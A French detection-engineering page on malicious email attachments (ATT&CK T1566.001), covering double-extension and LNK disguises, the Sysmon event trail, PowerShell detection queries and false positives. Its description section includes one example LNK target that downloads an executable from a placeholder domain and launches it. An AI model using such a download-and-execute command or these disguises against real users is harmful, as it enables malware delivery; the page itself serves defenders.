---
title: "Pièce jointe malveillante"
description: "L'attaquant envoie un exécutable, un script ou un raccourci déguisé en document, et compte sur l'utilisateur pour l'ouvrir lui-même."
tags: [windows, phishing, sysmon, lnk, powershell]
updated: 2026-11-18
draft: false
type: technique
attack_id: T1566.001
tactic: initial-access
severity: high
platforms: [Windows]
data_sources: [Sysmon]
related:
  - 03-menaces-detection/initial-access/media-amovible
---

## Description

Le phishing passe le pare-feu : c'est l'utilisateur qui fait entrer le malware, en ouvrant la pièce jointe (:attack[T1204.002]). Le fichier est souvent dans une archive `.zip` ou `.rar`, et déguisé :

| Déguisement | Exemple | Pourquoi ça marche |
| --- | --- | --- |
| Extension rare | `.com`, `.scr`, `.cpl` | Des exécutables, comme `.exe`, mais on s'en méfie moins. Un `www.skype.com` ressemble à une adresse de site. |
| Double extension | `invoice.pdf.exe`, `cat.png.com` | Windows masque les extensions connues : l'utilisateur voit `invoice.pdf`, avec une icône de PDF. |
| Raccourci (LNK) | `Visit Our Website!.lnk` | Le champ Cible d'un raccourci peut contenir n'importe quelle commande, et son icône est libre. Il sert à lancer un script PowerShell, VBS ou BAT, moins repéré par l'antivirus qu'un exécutable. |

Une cible de raccourci malveillante ressemble à ceci : télécharger le malware dans un dossier accessible en écriture, puis le lancer.

```powershell title="cible d'un LNK qui télécharge puis lance un malware"
powershell.exe -c (New-Object System.Net.WebClient).DownloadFile('https://domaine-compromis.example/r.exe','C:\ProgramData\r.exe'); start C:\ProgramData\r.exe
```

Pour lire la cible d'un raccourci suspect sans l'ouvrir : clic droit › Propriétés › onglet Raccourci.

## Ce qu'on observe

L'enchaînement dans Sysmon, pour une archive qui contient un exécutable à double extension :

:::etapes
1. **Le navigateur est lancé**
   Sysmon 1 : `Image` = `msedge.exe`, `ParentImage` = `explorer.exe`.
2. **L'archive est téléchargée**
   Sysmon 11 : `Image` = le navigateur, `TargetFilename` = `C:\Users\<utilisateur>\Downloads\invoice.zip`.
3. **L'archive est décompressée**
   Sysmon 11 : `Image` = `explorer.exe` ou `7zG.exe`, `TargetFilename` = `…\invoice.pdf.exe`. Le dossier de destination peut être n'importe lequel.
4. **L'utilisateur double-clique**
   Sysmon 1 : `Image` = `…\invoice.pdf.exe`, `ParentImage` = `explorer.exe`.
5. **Le malware agit**
   Sysmon 3 et 22 avec le même `ProcessId` : connexion à son serveur de commande. Sysmon 11 et 13 : fichiers déposés, persistance.
:::

Avec un **LNK**, l'exécution du raccourci n'est pas journalisée : l'Explorateur lit la cible et lance la commande lui-même. On voit donc directement `powershell.exe` avec `explorer.exe` pour parent. Ce qui trahit le raccourci, c'est l'événement Sysmon 11 qui le montre arriver dans `Downloads` (ou décompressé d'une archive) juste avant.

Méthode pour remonter un processus et suivre son activité : [Analyser un processus](../../01-fondamentaux/journaux-windows.md#analyser-un-processus).

## Détection

### PowerShell sur les journaux Sysmon

Sur un fichier exporté, remplacer `LogName='Microsoft-Windows-Sysmon/Operational'` par `Path='C:\chemin\Sysmon.evtx'`.

```powershell title="fichiers créés dans un dossier Downloads (Sysmon 11)"
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=11} |
  Where-Object { $_.Message -match '(?m)^TargetFilename: .*\\Downloads\\' } |
  Select-Object TimeCreated, Message
```

```powershell title="exécutables à double extension lancés (Sysmon 1)"
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} |
  Where-Object { $_.Message -match '(?m)^Image: .*\.(pdf|docx?|xlsx?|jpe?g|png|txt)\.(exe|com|scr)\s*$' } |
  Select-Object TimeCreated, Message
```

```powershell title="PowerShell lancé par l'Explorateur : raccourci possible (Sysmon 1)"
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} |
  Where-Object { $_.Message -match '(?m)^Image: .*\\powershell\.exe' -and $_.Message -match '(?m)^ParentImage: .*\\explorer\.exe' } |
  Select-Object TimeCreated, Message
```

## Faux positifs

:::faux-positifs
- **Installateur légitime** téléchargé puis lancé depuis `Downloads`.
- **PowerShell ouvert par l'utilisateur** depuis le menu Démarrer ou la barre des tâches : son parent est aussi `explorer.exe`. Regarder la ligne de commande : une console ouverte à la main n'a pas d'argument `-c` qui télécharge un fichier.
:::

:::piege
- **Ne pas se fier au nom affiché** : afficher les extensions (Explorateur › Affichage › Extensions de noms de fichiers) avant de juger un fichier.
- **Un LNK ne laisse presque pas de trace** : sans Sysmon 11 sur le dossier `Downloads`, rien ne distingue un raccourci piégé d'une commande lancée par l'utilisateur.
:::

## Réponse

À compléter.
